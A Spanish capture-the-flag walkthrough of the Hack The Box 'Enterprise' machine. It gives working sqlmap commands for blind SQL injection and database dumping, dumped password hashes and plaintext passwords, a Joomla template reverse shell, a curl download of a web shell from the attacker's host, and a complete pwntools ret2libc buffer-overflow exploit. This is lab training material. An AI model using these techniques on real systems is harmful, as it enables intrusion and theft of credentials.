

![1](</Writeups/Maquinas/Enterprise/img/logo.png>)
By Rug4lo

## Reconocimiento

Empezamos con el típico escaneo de [[Nmap]] para descubrir los puertos, y luego usaremos los scripts básicos de reconocimiento de nmap para cada puerto descubierto (en mi caso estoy usando el parámetro -oN para dejar un archivo con la información del escaneo)

```bash
nmap -sCV -p22,80,443,8080,32812 -oN Targeted 10.10.10.61
```
```bash
# Nmap 7.94SVN scan initiated Thu Mar 21 17:26:58 2024 as: nmap -sCV -p22,80,443,8080,32812 -oN Targeted 10.10.10.61
Nmap scan report for 10.10.10.61
Host is up (0.16s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac (RSA)
|   256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 (ECDSA)
|_  256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b (ED25519)
80/tcp    open  http     Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-generator: WordPress 4.8.1
|_http-title: USS Enterprise &#8211; Ships Log
443/tcp   open  ssl/http Apache httpd 2.4.25 ((Ubuntu))
|_http-server-header: Apache/2.4.25 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK
| Not valid before: 2017-08-25T10:35:14
|_Not valid after:  2017-09-24T10:35:14
| tls-alpn: 
|_  http/1.1
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp  open  http     Apache httpd 2.4.10 ((Debian))
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.10 (Debian)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
32812/tcp open  unknown
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions: 
|     _______ _______ ______ _______
|     |_____| |_____/ |______
|     |_____ |_____ | | | _ ______|
|     Welcome to the Library Computer Access and Retrieval System
|     Enter Bridge Access Code: 
|     Invalid Code
|     Terminating Console
|   NULL: 
|     _______ _______ ______ _______
|     |_____| |_____/ |______
|     |_____ |_____ | | | _ ______|
|     Welcome to the Library Computer Access and Retrieval System
|_    Enter Bridge Access Code:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port32812-TCP:V=7.94SVN%I=7%D=3/21%Time=65FC5FD9%P=x86_64-pc-linux-gnu%
SF:r(NULL,ED,"\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20_______\x20_______\x20\x20______\x20_______\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x2
SF:0\x20\x20\|_____\|\x20\|_____/\x20\|______\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\|_____\x20\|_____\x20\x20\|\x20\x20\x20\x20\x20\|\x20\|\x
SF:20\x20\x20\x20\\_\x20______\|\n\nWelcome\x20to\x20the\x20Library\x20Com
SF:puter\x20Access\x20and\x20Retrieval\x20System\n\nEnter\x20Bridge\x20Acc
SF:ess\x20Code:\x20\n")%r(GenericLines,110,"\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20_____
SF:_\x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x2
SF:0\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|_____
SF:_\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20\|
SF:\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcome\
SF:x20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20Sy
SF:stem\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTerm
SF:inating\x20Console\n\n")%r(GetRequest,110,"\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20___
SF:___\x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\
SF:x20\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|___
SF:___\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20
SF:\|\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcom
SF:e\x20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20
SF:System\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTe
SF:rminating\x20Console\n\n")%r(HTTPOptions,110,"\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20
SF:______\x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x
SF:20\x20\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|
SF:______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\
SF:x20\|\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWel
SF:come\x20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\
SF:x20System\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\
SF:nTerminating\x20Console\n\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar 21 17:27:17 2024 -- 1 IP address (1 host up) scanned in 18.56 seconds
```
Podemos ver que hay 3 paginas webs en esta maquina, a parte hay un puerto 32812 que esta corriendo un programa personalizado llamado lcars (podemos conectarnos a este puerto con net-cat)

Vamos a abrir cada pagina e inspeccionarlas con whatweb, con eso veremos que hay un Apache base, un wordpress y un joomla 
```bash
whatweb http://enterprise.htb
```

Vamos a empezar a inspeccionar el Apache, ya que es la que parece mas simple, primero usaremos dirsearch para ver los dominios de la web
```bash
dirsearch -u https://enterprise.htb/
```
```bash

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/rugalo/Desktop/rugalo/maquinas/htb/linux/Enterprise/nmap/reports/https_enterprise.htb/__24-03-24_15-34-51.txt

Target: https://enterprise.htb/

[15:34:51] Starting: 
[15:34:57] 403 -  301B  - /.ht_wsr.txt
[15:34:57] 403 -  304B  - /.htaccess.bak1
[15:34:57] 403 -  304B  - /.htaccess.orig
[15:34:57] 403 -  306B  - /.htaccess.sample
[15:34:57] 403 -  304B  - /.htaccess.save
[15:34:57] 403 -  304B  - /.htaccess_orig
[15:34:57] 403 -  302B  - /.htaccessBAK
[15:34:57] 403 -  302B  - /.htaccess_sc
[15:34:57] 403 -  305B  - /.htaccess_extra
[15:34:57] 403 -  302B  - /.htaccessOLD
[15:34:57] 403 -  303B  - /.htaccessOLD2
[15:34:57] 403 -  295B  - /.html
[15:34:57] 403 -  301B  - /.httr-oauth
[15:34:57] 403 -  294B  - /.htm
[15:34:57] 403 -  304B  - /.htpasswd_test
[15:34:57] 403 -  300B  - /.htpasswds
[15:34:59] 403 -  294B  - /.php
[15:34:59] 403 -  295B  - /.php3
[15:36:29] 301 -  318B  - /files  ->  https://enterprise.htb/files/
[15:36:29] 200 -  457B  - /files/
[15:37:06] 403 -  303B  - /server-status
[15:37:06] 403 -  304B  - /server-status/
```
Con esto vamos a ver que hay un /files, si nos metemos a este subdirectorio, veremos esto:

![1](</Writeups/Maquinas/Enterprise/img/1.png>)

Este archivo lcars.zip es interesante, nos lo podemos descargar y descomprimirlo, esto nos dará tres archivos

![1](</Writeups/Maquinas/Enterprise/img/2.png>)

Si vemos el primer archivo veremos que estos archivos php son de un plugin, muy probablemente de WordPress

![1](</Writeups/Maquinas/Enterprise/img/3.png>)

Los dos archivos restantes tienen pinta de ser los archivos de como funciona el plugin

lcars_db.php

![1](</Writeups/Maquinas/Enterprise/img/4.png>)

lcars_dbpost.php

![1](</Writeups/Maquinas/Enterprise/img/5.png>)

Si los inspeccionamos veremos que usan una query de MySQL la cual no esta sanitizada en el archivo **lcars_db.php**

Por lo que podemos intentar acceder a los archivos en la pagina web del WordPress

![1](</Writeups/Maquinas/Enterprise/img/6.png>)

Vemos que somos capaces de acceder, por lo que podemos intentar inyectar alguna id (ya que este script supuesta mente te da los datos de un usuario por su id)

![1](</Writeups/Maquinas/Enterprise/img/7.png>)

Vemos que no esta funcionando, pero podemos intentar una SQLI, en este caso estoy intentando ver si me hace una espera de 5 segundos al recargar la pagina

![1](</Writeups/Maquinas/Enterprise/img/8.png>)

Veremos como la pagina tarda en responder los 5 segundos por lo que es vulnerable a SQLI, pero si nos ponemos a intentar listar las bases de datos veremos que no nos representara información, por lo que es muy probable que se trate de una Blind SQLI basada en tiempo

Para esto podemos hacer un script en python, pero va a ser muy lento, por lo que podemos usar Sqlmap para listar las bases de datos
```bash
sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' --dbs --batch
```
```bash
available databases [8]:
[*] information_schema
[*] joomla
[*] joomladb
[*] mysql
[*] performance_schema
[*] sys
[*] wordpress
[*] wordpressdb
```
Podemos ver muchas bases de datos, pero las que nos interesan son la joomladb y la wordpress (ya que las otras están vacías,) por lo que procederemos a sacar toda las tablas de la base de datos joomladb 
```bash
sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' --dbs --batch -dbms mysql -D joomladb --tables
```
```bash
| edz2g_ucm_content             |
| edz2g_ucm_history             |
| edz2g_update_sites            |
| edz2g_update_sites_extensions |
| edz2g_updates                 |
| edz2g_user_keys               |
| edz2g_user_notes              |
| edz2g_user_profiles           |
| edz2g_user_usergroup_map      |
| edz2g_usergroups              |
| edz2g_users                   |
| edz2g_utf8_conversion         |
| edz2g_viewlevels              |
+-------------------------------+
```
Vemos la base de datos edz2g_users por lo que vamos a listar toda la información de esta
```bash
sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' --dbs --batch -dbms mysql -D joomladb -T edz2g_users --columns
```
```bash
+---------------+---------------+
| Column        | Type          |
+---------------+---------------+
| block         | tinyint(4)    |
| name          | varchar(400)  |
| activation    | varchar(100)  |
| email         | varchar(100)  |
| id            | int(11)       |
| lastResetTime | datetime      |
| lastvisitDate | datetime      |
| otep          | varchar(1000) |
| otpKey        | varchar(1000) |
| params        | text          |
| password      | varchar(100)  |
| registerDate  | datetime      |
| requireReset  | tinyint(4)    |
| resetCount    | int(11)       |
| sendEmail     | tinyint(4)    |
| username      | varchar(150)  |
+---------------+---------------+
```
```bash
sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' --dbs --batch -dbms mysql -D joomladb -T edz2g_users --columns -C email,name,username,password --dump
```
```bash
+--------------------------------+------------+-----------------+--------------------------------------------------------------+
| email                          | name       | username        | password                                                     |
+--------------------------------+------------+-----------------+--------------------------------------------------------------+
| geordi.la.forge@enterprise.htb | Super User | geordi.la.forge | $2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy |
| guinan@enterprise.htb          | Guinan     | Guinan          | $2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q |
+--------------------------------+------------+-----------------+--------------------------------------------------------------+
```
Ahora aremos lo mismo con la base de datos "wordpress", y sacaremos esto:
```bash
+----+------------------------------+---------------+------------------------------------+
| 1  | william.riker@enterprise.htb | william.riker | $P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2. |
+----+------------------------------+---------------+------------------------------------+
```
Podemos intentar deshashear las contraseñas con John pero no conseguiremos nada, en este punto  podemos continuar buscando por las bases de datos, hasta encontrar una tabla en la base de datos "wodpress" que se llama "wp_posts" si vemos toda la información de los posts de esa tabla y acabaremos viendo un post interesante
```bash
Needed somewhere to put some passwords quickly\r\n\r\nZxJyhGem4k338S2Y\r\n\r\nenterprisencc170\r\n\r\nZD3YxfnSjezg67JZ\r\n\r\nu*Z14ru0p#ttj83zS6\r\n\r\n \r\n\r\n   
```
Si lo ponemos mas bonito veremos que tenemos varias contraseñas, que en conjunto con los usuarios que hemos encontrado tenemos la posibilidad de probar
```bash
Needed somewhere to put some passwords quickly ZxJyhGem4k338S2Y enterprisencc170 ZD3YxfnSjezg67JZ u*Z14ru0p#ttj83zS6   
```
Encontraremos que en el Joomla (la web que esta en el puerto 8080) tiene un /admin y funcionara esta combinación
```bash
geordi.la.forge : ZD3YxfnSjezg67JZ
```
Perfecto una vez dentro del panel de administración podemos conseguir una reverse shell de la manera típica en el Joomla, nos vamos a Templates y modificamos el que este en uso, el error.php, ahi introducimos el comando en php que queramos, como la reverse shell, nos ponemos en escucha con net-cat y guardamos

![1](</Writeups/Maquinas/Enterprise/img/9.png>)

Al introducir una pagina que no existe nos saldrá la pagina de error y se ejecutara el comando por lo que recibiremos la reverse shell en nuestro equipo

![1](</Writeups/Maquinas/Enterprise/img/10.png>)

![1](</Writeups/Maquinas/Enterprise/img/11.png>)

Tenemos la shell, pero podemos ver que estamos en un contenedor
```
hostname -I
```
Si nos ponemos a investigar veremos que en el /var/www/html hay un directorio /files

El cual tiene lo mismo que tenia el servidor de Apache en su /files, por lo que podemos pensar que hay una montura a la maquina principal en ese directorio

![1](</Writeups/Maquinas/Enterprise/img/12.png>)

Gracias a esto podemos introducir un archivo php en este directorio que nos de una reverse shell al visualizarlo (en mi caso estoy usando p0wny-shell ya que se ve mas bonito)

Repositorio de la p0wny-shell --> https://github.com/flozz/p0wny-shell

```bash
curl http://10.10.14.18/shell.php -o ./shell.php
```
Visualizamos el archivo desde la maquina Apache

![1](</Writeups/Maquinas/Enterprise/img/13.png>)

![1](</Writeups/Maquinas/Enterprise/img/14.png>)

Vale, ahora nos volvemos a mandar la reverse shell para ganar acceso a la maquina principal

![1](</Writeups/Maquinas/Enterprise/img/15.png>)

Ahora que tenemos acceso a la maquina principal recordamos que en el puerto 32812 había una aplicación personalizada, podemos buscar si hay algún binario con el nombre de lcars
```bash
find / -iname lcars 2>/dev/null
```
```bash
/etc/xinetd.d/lcars
/bin/lcars
```
Tenemos al binario, podemos descargarnoslo y ejecutarlo para ver si es el mismo que corre en el puerto 32812

![1](</Writeups/Maquinas/Enterprise/img/16.png>)

Efectivamente es el mismo, pero nos pied una contraseña, podemos usar ltrace para ver si hace la comparación sin ofuscar a nivel de código

![1](</Writeups/Maquinas/Enterprise/img/17.png>)

Perfecto, tenemos la contraseña si la usamos nos saldrá un menu, podemos probar a meter muchas "A" en los campos a ver si sale algun error

![1](</Writeups/Maquinas/Enterprise/img/18.png>)

Perfecto, nos sale que hay un error al meternos en el menu 4 e insertar muchas "A" en el input, ahora podemos intentar con gdb-peda ver si tiene algún factor de seguridad desactivado 

Repositorio de peda --> https://github.com/longld/peda
```bash
gdb ./lcars -q
```
```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : ENABLED
RELRO     : Partial
```
Vemos que el PIE esta activado por lo que no nos sera posible hacer un BoF stack-based, pero como no tiene el NX activado podemos intentar un ret2libc 

En el ret2libc lo que hacemos es sobrescribir el EIP para que apunte a la dirección del system para que después apunte a la dirección del exit y finalmente a una dirección con la string /bin/sh 

Seria algo como esto: EIP --> System() --> Exit --> /bin/sh

Empezamos con lo bueno, primero vamos a calcular el offset hasta el EIP (el numero de caracteres que necesitamos para sobrescribir el EIP), para esto usaremos el pattern create de gdb-peda
```bash
gdb-peda$ pattern create 1000
```
E introduciremos este patron en vez de las "A"

![1](</Writeups/Maquinas/Enterprise/img/19.png>)

Con el comparador podemos ver el offset
```
gdb-peda$ pattern offset $eip
%$A% found at offset: 212
```
Tenemos el offset, ahora hay que descubrir las direcciones del system, exit y el sh

Para ver la dirección del system tendremos que ejecutar gdb (en la maquina Enterprise) Tenemos primero que listar las funciones
```bash
(gdb) info functions
```
Ahora tenemos que crear un brake point en la función main
```bash
(gdb) b *main
```
Ejecutamos el programa `(gdb) r`  y listamos la función system

![1](</Writeups/Maquinas/Enterprise/img/20.png>)

Haremos lo mismo para el exit

![1](</Writeups/Maquinas/Enterprise/img/21.png>)

Perfecto, ahora solo nos falta el string con el sh, para esto solo tendremos que ejecutar `find &system,+9999999,"sh"` (cualquiera de las direcciones nos sirven)

![1](</Writeups/Maquinas/Enterprise/img/22.png>)

Ahora tenemos todo lo necesario, por lo que podemos montar el script (recordando que las direcciones tienen que estar en little endian, y todo en formato bytes para que python3 no pete), yo lo hice de esta manera
```python
#!/usr/bin/python3

import time
from pwn import *

## BoF Creation

offset = 212
before_eip = b"A" * offset

Fsystem = p32(0xf7e4c060) 
Fexit = p32(0xf7e3faf0)
Fshell = p32(0xf7f6ddd5)

payload = before_eip + Fsystem + Fexit + Fshell

context(os='linux', arch='i386')
host, port = "10.10.10.61", 32812

## Conection to the machine

time.sleep(1)

r = remote(host, port)

## Recive and sending data

r.recvuntil(b"Enter Bridge Access Code:")
r.sendline(b"picarda1")
r.recvuntil(b"Waiting for input:")
r.sendline(b"4")
r.recvuntil(b"Enter Security Override:")
r.sendline(payload)

time.sleep(1)

## spawn the shell

r.interactive()
```
Con esto si ejecutamos el script veremos como ganamos acceso a la maquina como el usuario root